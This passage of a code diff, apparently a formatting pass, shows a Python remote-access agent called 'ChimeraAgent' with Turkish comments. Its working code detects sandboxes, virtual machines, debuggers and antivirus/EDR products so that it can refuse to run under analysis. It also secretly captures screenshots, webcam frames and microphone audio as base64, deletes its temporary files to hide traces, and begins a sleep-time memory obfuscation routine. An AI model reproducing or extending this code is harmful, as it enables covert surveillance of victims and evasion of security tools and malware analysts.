                     pass
-                    
+
             else:
                 # Linux/MacOS: dmidecode veya system_profiler
                 try:
                     if platform.system() == "Linux":
-                        output = subprocess.check_output(
-                            "sudo dmidecode -s system-manufacturer",
-                            shell=True,
-                            stderr=subprocess.DEVNULL,
-                            timeout=2
-                        ).decode('utf-8', errors='ignore').lower()
-                        
-                        if any(vm in output for vm in ["vmware", "virtualbox", "qemu", "kvm", "xen"]):
+                        output = (
+                            subprocess.check_output(
+                                "sudo dmidecode -s system-manufacturer",
+                                shell=True,
+                                stderr=subprocess.DEVNULL,
+                                timeout=2,
+                            )
+                            .decode("utf-8", errors="ignore")
+                            .lower()
+                        )
+
+                        if any(
+                            vm in output
+                            for vm in ["vmware", "virtualbox", "qemu", "kvm", "xen"]
+                        ):
                             result["vm_indicators"].append(f"DMI: {output.strip()}")
                             indicators_found += 1
                     elif platform.system() == "Darwin":
                         # MacOS - VM detection
-                        output = subprocess.check_output(
-                            "ioreg -l | grep -i 'manufacturer'",
-                            shell=True,
-                            stderr=subprocess.DEVNULL
-                        ).decode('utf-8', errors='ignore').lower()
-                        
-                        if any(vm in output for vm in ["vmware", "parallels", "virtualbox"]):
+                        output = (
+                            subprocess.check_output(
+                                "ioreg -l | grep -i 'manufacturer'",
+                                shell=True,
+                                stderr=subprocess.DEVNULL,
+                            )
+                            .decode("utf-8", errors="ignore")
+                            .lower()
+                        )
+
+                        if any(
+                            vm in output for vm in ["vmware", "parallels", "virtualbox"]
+                        ):
                             result["vm_indicators"].append("IORegistry: VM detected")
                             indicators_found += 1
                 except Exception:
                     pass
-            
+
             # 2. MAC Address kontrolü (VM'ler belirli prefix'ler kullanır)
             try:
                 if sys.platform == "win32":
-                    output = subprocess.check_output(
-                        "getmac",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('cp1254', errors='ignore').upper()
+                    output = (
+                        subprocess.check_output(
+                            "getmac", shell=True, stderr=subprocess.DEVNULL
+                        )
+                        .decode("cp1254", errors="ignore")
+                        .upper()
+                    )
                 else:
-                    output = subprocess.check_output(
-                        "ifconfig -a",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('utf-8', errors='ignore').upper()
-                
+                    output = (
+                        subprocess.check_output(
+                            "ifconfig -a", shell=True, stderr=subprocess.DEVNULL
+                        )
+                        .decode("utf-8", errors="ignore")
+                        .upper()
+                    )
+
                 vm_mac_prefixes = [
                     "00:05:69",  # VMware
                     "00:0C:29",  # VMware
@@ -2455,34 +2570,41 @@ class ChimeraAgent:
                     "00:16:3E",  # Xen
                     "00:1C:42",  # Parallels
                 ]
-                
+
                 for prefix in vm_mac_prefixes:
                     if prefix in output:
-                        result["vm_indicators"].append(f"MAC Address: VM prefix detected ({prefix})")
+                        result["vm_indicators"].append(
+                            f"MAC Address: VM prefix detected ({prefix})"
+                        )
                         indicators_found += 1
                         break
             except Exception:
                 pass
-            
+
             # 3. CPU Count (Sandbox'lar genelde düşük CPU kullanır)
             try:
                 import multiprocessing
+
                 cpu_count = multiprocessing.cpu_count()
                 if cpu_count <= 2:
-                    result["vm_indicators"].append(f"Low CPU count: {cpu_count} cores (suspicious)")
+                    result["vm_indicators"].append(
+                        f"Low CPU count: {cpu_count} cores (suspicious)"
+                    )
                     indicators_found += 0.5  # Yarım puan (her zaman VM değil)
             except Exception:
                 pass
-            
+
             # 4. Disk boyutu (Sandbox'lar genelde küçük disk kullanır)
             try:
-                total_disk = shutil.disk_usage('/').total / (1024**3)  # GB
+                total_disk = shutil.disk_usage("/").total / (1024**3)  # GB
                 if total_disk < 60:
-                    result["vm_indicators"].append(f"Small disk: {total_disk:.1f}GB (suspicious)")
+                    result["vm_indicators"].append(
+                        f"Small disk: {total_disk:.1f}GB (suspicious)"
+                    )
                     indicators_found += 0.5
             except Exception:
                 pass
-                
+
             # 5. Windows: Registry kontrolü (VM araçları)
             if sys.platform == "win32":
                 try:
@@ -2490,48 +2612,46 @@ class ChimeraAgent:
                     output = subprocess.check_output(
                         'reg query "HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools"',
                         shell=True,
-                        stderr=subprocess.DEVNULL
+                        stderr=subprocess.DEVNULL,
                     )
                     result["vm_indicators"].append("Registry: VMware Tools installed")
                     indicators_found += 2  # Kesin kanıt
                 except Exception:
                     pass
-            
+
             # 6. Zamanlama Analizi (Sandbox'lar sleep'i hızlandırabilir)
             try:
                 expected_delay = 0.5
                 t_start = time.time()
                 time.sleep(expected_delay)
                 t_elapsed = time.time() - t_start
-                
+
                 # Beklenen süreden %20'den fazla sapma varsa sandbox olabilir
                 deviation = abs(t_elapsed - expected_delay) / expected_delay
                 if deviation > 0.20:
                     result["vm_indicators"].append(
                         f"Timing: Sleep {expected_delay}s beklendi, {t_elapsed:.3f}s geçti "
-                        f"(sapma: %{deviation*100:.0f})"
+                        f"(sapma: %{deviation * 100:.0f})"
                     )
                     indicators_found += 1.5
             except Exception:
                 pass
-            
+
             # 7. Process Sayısı Kontrolü (Normal sistem 50+ process)
             try:
                 if sys.platform == "win32":
                     output = subprocess.check_output(
-                        "tasklist /NH",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('cp1254', errors='ignore')
-                    proc_count = len([l for l in output.strip().split('\n') if l.strip()])
+                        "tasklist /NH", shell=True, stderr=subprocess.DEVNULL
+                    ).decode("cp1254", errors="ignore")
+                    proc_count = len(
+                        [l for l in output.strip().split("\n") if l.strip()]
+                    )
                 else:
                     output = subprocess.check_output(
-                        "ps aux",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('utf-8', errors='ignore')
-                    proc_count = len(output.strip().split('\n')) - 1  # Header çıkar
-                
+                        "ps aux", shell=True, stderr=subprocess.DEVNULL
+                    ).decode("utf-8", errors="ignore")
+                    proc_count = len(output.strip().split("\n")) - 1  # Header çıkar
+
                 if proc_count < 30:
                     result["vm_indicators"].append(
                         f"Low process count: {proc_count} (normal > 50)"
@@ -2539,7 +2659,7 @@ class ChimeraAgent:
                     indicators_found += 1
             except Exception:
                 pass
-            
+
             # 8. Dosya Sistemi Yapaylık Kontrolü (Kullanıcı izleri)
             try:
                 user_artifacts = 0
@@ -2561,7 +2681,7 @@ class ChimeraAgent:
                         os.path.join(home, ".mozilla"),
                         os.path.join(home, ".config", "google-chrome"),
                     ]
-                
+
                 for path in check_paths:
                     if os.path.exists(path):
                         try:
@@ -2570,7 +2690,7 @@ class ChimeraAgent:
                                 user_artifacts += 1
                         except Exception:
                             pass
-                
+
                 if user_artifacts < 2:
                     result["vm_indicators"].append(
                         f"Low user artifacts: {user_artifacts}/5 (sandbox indicator)"
@@ -2578,44 +2698,62 @@ class ChimeraAgent:
                     indicators_found += 0.5
             except Exception:
                 pass
-            
+
             # 9. Bilinen Sandbox Araç/Process Tespiti
             try:
                 sandbox_indicators = [
                     # Cuckoo Sandbox
-                    "agent.py", "analyzer.py", "cuckoomon",
-                    # Joe Sandbox  
-                    "joeboxcontrol", "joeboxserver",
+                    "agent.py",
+                    "analyzer.py",
+                    "cuckoomon",
+                    # Joe Sandbox
+                    "joeboxcontrol",
+                    "joeboxserver",
                     # Any.Run
-                    "anyrun", "anydeskad",
+                    "anyrun",
+                    "anydeskad",
                     # Hybrid Analysis / VxStream
-                    "vxstream", "fiddler",
+                    "vxstream",
+                    "fiddler",
                     # Genel analiz araçları
-                    "procmon", "procexp", "wireshark", "tcpdump",
-                    "x64dbg", "x32dbg", "ollydbg", "ida",
-                    "processhacker", "autoruns",
+                    "procmon",
+                    "procexp",
+                    "wireshark",
+                    "tcpdump",
+                    "x64dbg",
+                    "x32dbg",
+                    "ollydbg",
+                    "ida",
+                    "processhacker",
+                    "autoruns",
                     # Sandbox DLL'leri
-                    "sbiedll", "dbghelp", "api_log",
+                    "sbiedll",
+                    "dbghelp",
+                    "api_log",
                 ]
-                
+
                 if sys.platform == "win32":
-                    proc_output = subprocess.check_output(
-                        "tasklist /NH",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('cp1254', errors='ignore').lower()
+                    proc_output = (
+                        subprocess.check_output(
+                            "tasklist /NH", shell=True, stderr=subprocess.DEVNULL
+                        )
+                        .decode("cp1254", errors="ignore")
+                        .lower()
+                    )
                 else:
-                    proc_output = subprocess.check_output(
-                        "ps aux",
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode('utf-8', errors='ignore').lower()
-                
+                    proc_output = (
+                        subprocess.check_output(
+                            "ps aux", shell=True, stderr=subprocess.DEVNULL
+                        )
+                        .decode("utf-8", errors="ignore")
+                        .lower()
+                    )
+
                 found_tools = []
                 for tool in sandbox_indicators:
                     if tool in proc_output:
                         found_tools.append(tool)
-                
+
                 if found_tools:
                     result["vm_indicators"].append(
                         f"Sandbox tools detected: {', '.join(found_tools[:5])}"
@@ -2623,27 +2761,26 @@ class ChimeraAgent:
                     indicators_found += 2
             except Exception:
                 pass
-            
+
             # 10. Kullanıcı Etkileşimi Kontrolü
             try:
                 if sys.platform == "win32":
                     # Windows: GetLastInputInfo ile son kullanıcı girişi
-                    import ctypes
-                    from ctypes import Structure, c_uint, sizeof, byref, windll
-                    
+                    from ctypes import Structure, byref, c_uint, sizeof, windll
+
                     class LASTINPUTINFO(Structure):
                         _fields_ = [
                             ("cbSize", c_uint),
                             ("dwTime", c_uint),
                         ]
-                    
+
                     lii = LASTINPUTINFO()
                     lii.cbSize = sizeof(LASTINPUTINFO)
                     windll.user32.GetLastInputInfo(byref(lii))
-                    
+
                     tick_count = windll.kernel32.GetTickCount()
                     idle_seconds = (tick_count - lii.dwTime) / 1000.0
-                    
+
                     # 10 dakikadan fazla etkileşimsizlik
                     if idle_seconds > 600:
                         result["vm_indicators"].append(
@@ -2651,14 +2788,16 @@ class ChimeraAgent:
                         )
                         indicators_found += 0.5
                 else:
-                    # Linux: /proc/uptime vs son giriş zamanı  
+                    # Linux: /proc/uptime vs son giriş zamanı
                     try:
-                        uptime_output = subprocess.check_output(
-                            "uptime",
-                            shell=True,
-                            stderr=subprocess.DEVNULL
-                        ).decode('utf-8', errors='ignore').strip()
-                        
+                        uptime_output = (
+                            subprocess.check_output(
+                                "uptime", shell=True, stderr=subprocess.DEVNULL
+                            )
+                            .decode("utf-8", errors="ignore")
+                            .strip()
+                        )
+
                         # "0 users" kontrolü
                         if "0 users" in uptime_output or "0 user" in uptime_output:
                             result["vm_indicators"].append(
@@ -2669,7 +2808,7 @@ class ChimeraAgent:
                         pass
             except Exception:
                 pass
-            
+
             # Güven seviyesini belirle
             if indicators_found >= 3:
                 result["is_virtualized"] = True
@@ -2679,15 +2818,15 @@ class ChimeraAgent:
                 result["confidence"] = "medium"
             elif indicators_found >= 0.5:
                 result["confidence"] = "low"
-                
+
         except Exception:
             pass
-        
+
         return result
-    
+
     def detect_environment(self) -> str:
         """Ortam analizi yapar - AV/EDR ve VM tespiti.
-        
+
         Returns:
             str: Formatlanmış ortam analizi raporu
         """
@@ -2695,46 +2834,52 @@ class ChimeraAgent:
         output.append("=" * 60)
         output.append("ORTAM ANALİZİ RAPORU")
         output.append("=" * 60)
-        
+
         # 1. Güvenlik Ürünleri Tespiti
         output.append("\n[+] Antivirüs/EDR Taraması:")
         av_result = self.detect_security_products()
-        
+
         if av_result["detected"]:
-            output.append(f"    ⚠️  {len(av_result['detected'])} güvenlik ürünü tespit edildi:")
+            output.append(
+                f"    ⚠️  {len(av_result['detected'])} güvenlik ürünü tespit edildi:"
+            )
             for product in av_result["detected"]:
                 output.append(f"       • {product}")
         else:
             output.append("    ✓  Bilinen güvenlik ürünü tespit edilmedi")
-        
+
         if av_result["suspicious_processes"]:
-            output.append(f"\n    Şüpheli Process'ler ({len(av_result['suspicious_processes'])}):")
+            output.append(
+                f"\n    Şüpheli Process'ler ({len(av_result['suspicious_processes'])}):"
+            )
             for proc in av_result["suspicious_processes"][:10]:  # İlk 10'u göster
                 output.append(f"       - {proc}")
-        
+
         # 2. Sanallaştırma Tespiti
         output.append("\n[+] Sanallaştırma/Sandbox Kontrolü:")
         vm_result = self.detect_virtualization()
-        
+
         if vm_result["is_virtualized"]:
             confidence_emoji = "🔴" if vm_result["confidence"] == "high" else "🟡"
-            output.append(f"    {confidence_emoji} Sanal ortam tespit edildi (Güven: {vm_result['confidence'].upper()})")
-            
+            output.append(
+                f"    {confidence_emoji} Sanal ortam tespit edildi (Güven: {vm_result['confidence'].upper()})"
+            )
+
             if vm_result["vm_indicators"]:
-                output.append(f"    Göstergeler:")
+                output.append("    Göstergeler:")
                 for indicator in vm_result["vm_indicators"]:
                     output.append(f"       • {indicator}")
         else:
             output.append("    ✓  Fiziksel makine olarak görünüyor")
             if vm_result["vm_indicators"]:
-                output.append(f"    Not: Bazı VM göstergeleri bulundu ama kesin değil:")
+                output.append("    Not: Bazı VM göstergeleri bulundu ama kesin değil:")
                 for indicator in vm_result["vm_indicators"]:
                     output.append(f"       • {indicator}")
-        
+
         # 3. Genel Risk Değerlendirmesi
         output.append("\n[+] Risk Değerlendirmesi:")
         risk_score = 0
-        
+
         if len(av_result["detected"]) > 0:
             risk_score += 3
         if len(av_result["detected"]) >= 2:
@@ -2743,47 +2888,48 @@ class ChimeraAgent:
             risk_score += 3
         elif vm_result["is_virtualized"]:
             risk_score += 1
-        
+
         if risk_score >= 5:
             risk_level = "🔴 YÜKSEK - Güvenlik kontrollü ortam"
         elif risk_score >= 3:
             risk_level = "🟡 ORTA - Dikkatli hareket edin"
         else:
             risk_level = "🟢 DÜŞÜK - Normal ortam"
-        
+
         output.append(f"    {risk_level}")
         output.append(f"    Risk Skoru: {risk_score}/10")
-        
+
         output.append("\n" + "=" * 60)
         return "\n".join(output)
-    
+
     def detect_environment_precheck(self) -> bool:
         """Hızlı sandbox ön kontrol — agent başlangıcında çağrılabilir.
-        
+
         Tam ortam analizi yapmadan birkaç hızlı kontrol ile sandbox
         olasılığını değerlendirir.
-        
+
         Returns:
             bool: True ise sandbox/VM tespit edildi (çalışmayı reddedebilir).
         """
         score = 0
-        
+
         # 1. CPU sayısı
         try:
             import multiprocessing
+
             if multiprocessing.cpu_count() <= 1:
                 score += 2
         except Exception:
             pass
-        
+
         # 2. Disk boyutu
         try:
-            total_disk = shutil.disk_usage('/').total / (1024**3)
+            total_disk = shutil.disk_usage("/").total / (1024**3)
             if total_disk < 40:
                 score += 1.5
         except Exception:
             pass
-        
+
         # 3. Hızlı timing kontrolü
         try:
             t0 = time.time()
@@ -2793,39 +2939,42 @@ class ChimeraAgent:
                 score += 2
         except Exception:
             pass
-        
+
         # 4. RAM kontrolü (çok düşük RAM sandbox göstergesi)
         try:
             if sys.platform == "win32":
                 import ctypes
+
                 kernel32 = ctypes.windll.kernel32
-                
+
                 class MEMORYSTATUSEX(ctypes.Structure):
-                    _fields_ = [("dwLength", ctypes.c_ulong),
-                                ("dwMemoryLoad", ctypes.c_ulong),
-                                ("ullTotalPhys", ctypes.c_ulonglong),
-                                ("ullAvailPhys", ctypes.c_ulonglong),
-                                ("ullTotalPageFile", ctypes.c_ulonglong),
-                                ("ullAvailPageFile", ctypes.c_ulonglong),
-                                ("ullTotalVirtual", ctypes.c_ulonglong),
-                                ("ullAvailVirtual", ctypes.c_ulonglong),
-                                ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
-                
+                    _fields_ = [
+                        ("dwLength", ctypes.c_ulong),
+                        ("dwMemoryLoad", ctypes.c_ulong),
+                        ("ullTotalPhys", ctypes.c_ulonglong),
+                        ("ullAvailPhys", ctypes.c_ulonglong),
+                        ("ullTotalPageFile", ctypes.c_ulonglong),
+                        ("ullAvailPageFile", ctypes.c_ulonglong),
+                        ("ullTotalVirtual", ctypes.c_ulonglong),
+                        ("ullAvailVirtual", ctypes.c_ulonglong),
+                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
+                    ]
+
                 meminfo = MEMORYSTATUSEX()
                 meminfo.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                 kernel32.GlobalMemoryStatusEx(ctypes.byref(meminfo))
                 ram_gb = meminfo.ullTotalPhys / (1024**3)
             else:
-                with open('/proc/meminfo', 'r') as f:
+                with open("/proc/meminfo") as f:
                     mem_line = f.readline()
                 ram_kb = int(mem_line.split()[1])
                 ram_gb = ram_kb / (1024**2)
-            
+
             if ram_gb < 2:
                 score += 1.5
         except Exception:
             pass
-        
+
         return score >= 3
 
     # --------------------------------------------------------
@@ -2833,130 +2982,137 @@ class ChimeraAgent:
     # --------------------------------------------------------
     def take_screenshot(self, quality: int = 100, fmt: str = "png") -> str:
         """Anlık ekran görüntüsü alıp base64 encoded olarak döner.
-        
+
         Tüm işlem RAM üzerinde gerçekleşir, diske herhangi bir dosya yazılmaz.
         Platform bağımsız çalışır: Windows, Linux, macOS.
-        
+
         Args:
             quality: JPEG kalitesi (1-100)
             fmt: Resim formatı (png, jpeg, bmp)
-            
+
         Returns:
             str: SCREENSHOT_OK:<base64_png_data> veya hata mesajı
         """
         import io
         import tempfile
-        
+
         png_data = None
         fmt_upper = fmt.upper()
         if fmt_upper not in ["PNG", "JPEG", "BMP"]:
             fmt_upper = "PNG"
-            
+
         # Yöntem 1: mss + PIL kütüphanesi
         try:
             import mss
             from PIL import Image
+
             with mss.mss() as sct:
                 monitor = sct.monitors[0]
                 screenshot = sct.grab(monitor)
-                
-                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+
+                img = Image.frombytes(
+                    "RGB", screenshot.size, screenshot.bgra, "raw", "BGRX"
+                )
                 buffer = io.BytesIO()
-                
+
                 if fmt_upper == "JPEG":
                     img = img.convert("RGB")
-                    img.save(buffer, format='JPEG', quality=quality)
+                    img.save(buffer, format="JPEG", quality=quality)
                 else:
                     img.save(buffer, format=fmt_upper)
-                    
+
                 png_data = buffer.getvalue()
                 buffer.close()
-            
-            b64_data = base64.b64encode(png_data).decode('utf-8')
+
+            b64_data = base64.b64encode(png_data).decode("utf-8")
             return f"SCREENSHOT_OK:{b64_data}"
         except ImportError:
             pass  # PIL veya mss yok
         except Exception:
             pass
-            
+
         # Yöntem 1 Fallback (sadece mss, PIL yoksa)
         try:
             import mss
+
             with mss.mss() as sct:
                 monitor = sct.monitors[0]
                 screenshot = sct.grab(monitor)
                 png_data = mss.tools.to_png(screenshot.rgb, screenshot.size)
-            
-            b64_data = base64.b64encode(png_data).decode('utf-8')
+
+            b64_data = base64.b64encode(png_data).decode("utf-8")
             return f"SCREENSHOT_OK:{b64_data}"
         except ImportError:
             pass
         except Exception:
             pass
-        
+
         # Yöntem 2: PIL/Pillow kütüphanesi
         try:
             from PIL import ImageGrab
+
             img = ImageGrab.grab()
             buffer = io.BytesIO()
             if fmt_upper == "JPEG":
                 img = img.convert("RGB")
-                img.save(buffer, format='JPEG', quality=quality)
+                img.save(buffer, format="JPEG", quality=quality)
             else:
                 img.save(buffer, format=fmt_upper)
             png_data = buffer.getvalue()
             buffer.close()
-            
-            b64_data = base64.b64encode(png_data).decode('utf-8')
+
+            b64_data = base64.b64encode(png_data).decode("utf-8")
             return f"SCREENSHOT_OK:{b64_data}"
         except ImportError:
             pass
         except Exception:
             pass
-        
+
         # Yöntem 3: Platform spesifik araçlar (standart kütüphane + OS araçları)
         if sys.platform == "win32":
             # Windows: ctypes ile GDI+ kullanarak ekran görüntüsü
             try:
                 import ctypes
-                from ctypes import windll, c_int, c_uint, c_void_p, byref, sizeof
-                from ctypes.wintypes import DWORD, LONG, WORD, BYTE
-                
+                from ctypes import byref, sizeof, windll
+                from ctypes.wintypes import DWORD, LONG, WORD
+
                 # Ekran boyutlarını al
                 user32 = windll.user32
                 gdi32 = windll.gdi32
-                
-                width = user32.GetSystemMetrics(0)   # SM_CXSCREEN
-                height = user32.GetSystemMetrics(1)   # SM_CYSCREEN
-                
+
+                width = user32.GetSystemMetrics(0)  # SM_CXSCREEN
+                height = user32.GetSystemMetrics(1)  # SM_CYSCREEN
+
                 # Device Context oluştur
                 hdesktop = user32.GetDesktopWindow()
                 hdc = user32.GetWindowDC(hdesktop)
                 memdc = gdi32.CreateCompatibleDC(hdc)
-                
+
                 # Bitmap oluştur
                 hbitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
                 gdi32.SelectObject(memdc, hbitmap)
-                
+
                 # Ekranı kopyala
-                gdi32.BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)  # SRCCOPY
-                
+                gdi32.BitBlt(
+                    memdc, 0, 0, width, height, hdc, 0, 0, 0x00CC0020
+                )  # SRCCOPY
+
                 # BITMAPINFOHEADER yapısı (40 byte)
                 class BITMAPINFOHEADER(ctypes.Structure):
                     _fields_ = [
-                        ('biSize', DWORD),
-                        ('biWidth', LONG),
-                        ('biHeight', LONG),
-                        ('biPlanes', WORD),
-                        ('biBitCount', WORD),
-                        ('biCompression', DWORD),
-                        ('biSizeImage', DWORD),
-                        ('biXPelsPerMeter', LONG),
-                        ('biYPelsPerMeter', LONG),
-                        ('biClrUsed', DWORD),
-                        ('biClrImportant', DWORD),
+                        ("biSize", DWORD),
+                        ("biWidth", LONG),
+                        ("biHeight", LONG),
+                        ("biPlanes", WORD),
+                        ("biBitCount", WORD),
+                        ("biCompression", DWORD),
+                        ("biSizeImage", DWORD),
+                        ("biXPelsPerMeter", LONG),
+                        ("biYPelsPerMeter", LONG),
+                        ("biClrUsed", DWORD),
+                        ("biClrImportant", DWORD),
                     ]
-                
+
                 bi = BITMAPINFOHEADER()
                 bi.biSize = sizeof(BITMAPINFOHEADER)
                 bi.biWidth = width
@@ -2965,50 +3121,54 @@ class ChimeraAgent:
                 bi.biBitCount = 24
                 bi.biCompression = 0  # BI_RGB
                 bi.biSizeImage = width * height * 3
-                
+
                 # Pixel verilerini al
                 pixel_data = ctypes.create_string_buffer(bi.biSizeImage)
                 gdi32.GetDIBits(memdc, hbitmap, 0, height, pixel_data, byref(bi), 0)
-                
+
                 # BMP formatında oluştur (RAM üzerinde)
-                bmp_header = struct.pack('<2sIHHI', b'BM',
+                bmp_header = struct.pack(
+                    "<2sIHHI",
+                    b"BM",
                     14 + sizeof(BITMAPINFOHEADER) + bi.biSizeImage,
-                    0, 0,
-                    14 + sizeof(BITMAPINFOHEADER))
-                
+                    0,
+                    0,
+                    14 + sizeof(BITMAPINFOHEADER),
+                )
+
                 # biHeight'ı pozitif yap (BMP formatı için)
                 bi.biHeight = height
                 bmp_data = bmp_header + bytes(bi) + pixel_data.raw
-                
+
                 # Temizlik
                 gdi32.DeleteObject(hbitmap)
                 gdi32.DeleteDC(memdc)
                 user32.ReleaseDC(hdesktop, hdc)
-                
-                b64_data = base64.b64encode(bmp_data).decode('utf-8')
+
+                b64_data = base64.b64encode(bmp_data).decode("utf-8")
                 return f"SCREENSHOT_OK:{b64_data}"
-                
+
             except Exception as e:
-                return f"[!] Screenshot hatası (Windows ctypes): {str(e)}"
-                
+                return f"[!] Screenshot hatası (Windows ctypes): {e!s}"
+
         elif sys.platform == "darwin":
             # macOS: screencapture komutu (stdout'a yönlendir)
             try:
                 # Geçici dosya kullanmadan pipe ile al
-                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
-                result = subprocess.run(
-                    ["screencapture", "-x", tmp_path],
-                    capture_output=True,
-                    timeout=10
+                tmp_path = os.path.join(
+                    tempfile.gettempdir(), f".sc_{random.randint(100000, 999999)}.png"
                 )
-                
+                result = subprocess.run(
+                    ["screencapture", "-x", tmp_path], capture_output=True, timeout=10
+                )
+
                 if os.path.exists(tmp_path):
                     with open(tmp_path, "rb") as f:
                         png_data = f.read()
                     # Hemen sil (izleri temizle)
                     os.remove(tmp_path)
-                    
-                    b64_data = base64.b64encode(png_data).decode('utf-8')
+
+                    b64_data = base64.b64encode(png_data).decode("utf-8")
                     return f"SCREENSHOT_OK:{b64_data}"
                 else:
                     return "[!] Screenshot alınamadı (screencapture başarısız)"
@@ -3019,157 +3179,163 @@ class ChimeraAgent:
                         os.remove(tmp_path)
                 except:
                     pass
-                return f"[!] Screenshot hatası (macOS): {str(e)}"
-                
+                return f"[!] Screenshot hatası (macOS): {e!s}"
+
         else:
             # Linux: scrot, import (ImageMagick) veya xdg araçları
             tools = [
-                ["scrot", "-o", "/dev/stdout"],           # scrot stdout'a
-                ["import", "-window", "root", "png:-"],   # ImageMagick
-                ["gnome-screenshot", "-f", "/dev/stdout"], # GNOME
+                ["scrot", "-o", "/dev/stdout"],  # scrot stdout'a
+                ["import", "-window", "root", "png:-"],  # ImageMagick
+                ["gnome-screenshot", "-f", "/dev/stdout"],  # GNOME
             ]
-            
+
             for tool_cmd in tools:
                 try:
-                    result = subprocess.run(
-                        tool_cmd,
-                        capture_output=True,
-                        timeout=10
-                    )
+                    result = subprocess.run(tool_cmd, capture_output=True, timeout=10)
                     if result.returncode == 0 and result.stdout:
                         png_data = result.stdout
-                        b64_data = base64.b64encode(png_data).decode('utf-8')
+                        b64_data = base64.b64encode(png_data).decode("utf-8")
                         return f"SCREENSHOT_OK:{b64_data}"
                 except FileNotFoundError:
                     continue  # Bu araç yüklü değil, sonrakini dene
                 except Exception:
                     continue
-            
+
             # Hiçbir araç çalışmadıysa geçici dosya yöntemi
             try:
-                tmp_path = os.path.join(tempfile.gettempdir(), f".sc_{random.randint(100000,999999)}.png")
+                tmp_path = os.path.join(
+                    tempfile.gettempdir(), f".sc_{random.randint(100000, 999999)}.png"
+                )
                 for fallback_cmd in [
                     ["scrot", tmp_path],
                     ["import", "-window", "root", tmp_path],
                 ]:
                     try:
-                        result = subprocess.run(fallback_cmd, capture_output=True, timeout=10)
+                        result = subprocess.run(
+                            fallback_cmd, capture_output=True, timeout=10
+                        )
                         if os.path.exists(tmp_path):
                             with open(tmp_path, "rb") as f:
                                 png_data = f.read()
                             os.remove(tmp_path)
-                            b64_data = base64.b64encode(png_data).decode('utf-8')
+                            b64_data = base64.b64encode(png_data).decode("utf-8")
                             return f"SCREENSHOT_OK:{b64_data}"
                     except FileNotFoundError:
                         continue
                     except Exception:
                         continue
-                        
+
                 return "[!] Screenshot alınamadı. Gerekli araçlar: mss, Pillow, scrot veya ImageMagick"
             except Exception as e:
-                return f"[!] Screenshot hatası (Linux): {str(e)}"
-        
+                return f"[!] Screenshot hatası (Linux): {e!s}"
+
         return "[!] Screenshot alınamadı. Lütfen 'pip install mss' veya 'pip install Pillow' kurun."
 
     def take_webcam_snap(self) -> str:
         """Kameradan tek bir kare fotoğraf çeker.
-        
+
         Returns:
             str: WEBCAM_OK:<base64_data> veya hata mesajı
         """
         try:
             import cv2
+
             cap = cv2.VideoCapture(0)
             if not cap.isOpened():
                 return "[!] Kamera bulunamadı veya açılamadı."
-            
+
             # Kameranın ısınması için küçük bir bekleme ve frame atlama yapabiliriz
             # ama hızlı olması için doğrudan çekelim.
             ret, frame = cap.read()
             cap.release()
-            
+
             if not ret:
                 return "[!] Kameradan görüntü okunamadı."
-                
+
             # JPEG'e kodla
-            ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
+            ret, buffer = cv2.imencode(
+                ".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90]
+            )
             if not ret:
                 return "[!] Görüntü kodlanamadı."
-                
-            b64_data = base64.b64encode(buffer).decode('utf-8')
+
+            b64_data = base64.b64encode(buffer).decode("utf-8")
             return f"WEBCAM_OK:{b64_data}"
         except ImportError:
             return "[!] cv2 kütüphanesi eksik, webcam özelliği desteklenmiyor."
         except Exception as e:
-            return f"[!] Webcam hatası: {str(e)}"
-            
+            return f"[!] Webcam hatası: {e!s}"
+
     def record_audio(self, seconds: int = 5) -> str:
         """Mikrofondan ses kaydeder.
-        
+
         Returns:
             str: AUDIO_OK:<base64_wav_data> veya hata mesajı
         """
         try:
-            import pyaudio
-            import wave
             import io
-            
+            import wave
+
+            import pyaudio
+
             CHUNK = 1024
             FORMAT = pyaudio.paInt16
             CHANNELS = 1
             RATE = 44100
-            
+
             p = pyaudio.PyAudio()
             # Varsayılan input device'ı bul
             try:
-                stream = p.open(format=FORMAT,
-                                channels=CHANNELS,
-                                rate=RATE,
-                                input=True,
-                                frames_per_buffer=CHUNK)
+                stream = p.open(
+                    format=FORMAT,
+                    channels=CHANNELS,
+                    rate=RATE,
+                    input=True,
+                    frames_per_buffer=CHUNK,
+                )
             except Exception as e:
                 p.terminate()
-                return f"[!] Mikrofon açılamadı: {str(e)}"
-                
+                return f"[!] Mikrofon açılamadı: {e!s}"
+
             frames = []
             for i in range(0, int(RATE / CHUNK * seconds)):
                 data = stream.read(CHUNK)
                 frames.append(data)
-                
+
             stream.stop_stream()
             stream.close()
             p.terminate()
-            
+
             # WAV oluştur
             buffer = io.BytesIO()
-            wf = wave.open(buffer, 'wb')
+            wf = wave.open(buffer, "wb")
             wf.setnchannels(CHANNELS)
             wf.setsampwidth(p.get_sample_size(FORMAT))
             wf.setframerate(RATE)
-            wf.writeframes(b''.join(frames))
+            wf.writeframes(b"".join(frames))
             wf.close()
-            
+
             wav_data = buffer.getvalue()
             buffer.close()
-            
-            b64_data = base64.b64encode(wav_data).decode('utf-8')
+
+            b64_data = base64.b64encode(wav_data).decode("utf-8")
             return f"AUDIO_OK:{b64_data}"
-            
+
         except ImportError:
             return "[!] pyaudio kütüphanesi eksik, ses kayıt özelliği desteklenmiyor."
         except Exception as e:
-            return f"[!] Ses kayıt hatası: {str(e)}"
+            return f"[!] Ses kayıt hatası: {e!s}"
 
     # --------------------------------------------------------
     # Sleep Obfuscation (Uyku Sırasında Bellek Koruma)
     # --------------------------------------------------------
     def _xor_memory(self, data: bytes, key: bytes) -> bytes:
         """Veriyi XOR ile şifreler/çözer.
-        
+
         Args:
             data: Şifrelenecek/çözülecek veri.
